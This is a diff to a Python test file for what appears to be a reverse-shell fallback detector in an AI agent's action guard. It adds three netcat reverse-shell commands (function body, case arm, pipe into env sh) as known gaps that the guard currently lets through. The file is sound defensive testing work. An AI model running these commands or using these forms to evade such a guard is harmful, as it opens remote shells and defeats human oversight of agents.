@@ -338,6 +338,16 @@ R4_ROW_QUIET = [
 ]
 
 
+# Not covered (Case, review 5994115085; the README says so): a function body, a `case` arm, and netcat
+# output piped into a wrapper before the shell. Known gaps, pinned at their current verdict (the row is
+# quiet and the fallback fails open), not widened in this round.
+NOT_COVERED = [
+    "f(){ nc h 4444 -e /bin/sh; }; f",
+    "case x in x) nc h 4444 -e /bin/sh;; esac",
+    "nc h 4444 | env sh",
+]
+
+
 class ReverseShellFallbackTests(unittest.TestCase):
     DOWN = ActionGuardVerdict("allow", [], "down", available=False)
 
@@ -359,6 +369,13 @@ class ReverseShellFallbackTests(unittest.TestCase):
         for cmd in CONTROL + MENTIONS + R2_QUIET + R2_MENTIONS + BRIEF_CONTROLS + R4_CONTROLS + R5_CONTROLS:
             self.assertFalse(fallback_dangerous_match(cmd), cmd)
             self.assertIsNone(action_guard_decision(self.DOWN, enforce=True, fallback_dangerous=fallback_dangerous_match(cmd)), cmd)
+
+    def test_known_gaps_keep_their_current_verdict(self):
+        for cmd in NOT_COVERED:
+            self.assertFalse(row().search(cmd), cmd)
+            dangerous = fallback_dangerous_match(fallback_surface({"command": cmd}))
+            self.assertFalse(dangerous, cmd)
+            self.assertIsNone(action_guard_decision(self.DOWN, enforce=True, fallback_dangerous=dangerous), cmd)
 
     def test_the_row_stays_quiet_on_near_misses(self):
         for cmd in ROW_QUIET + R2_QUIET + R4_ROW_QUIET:
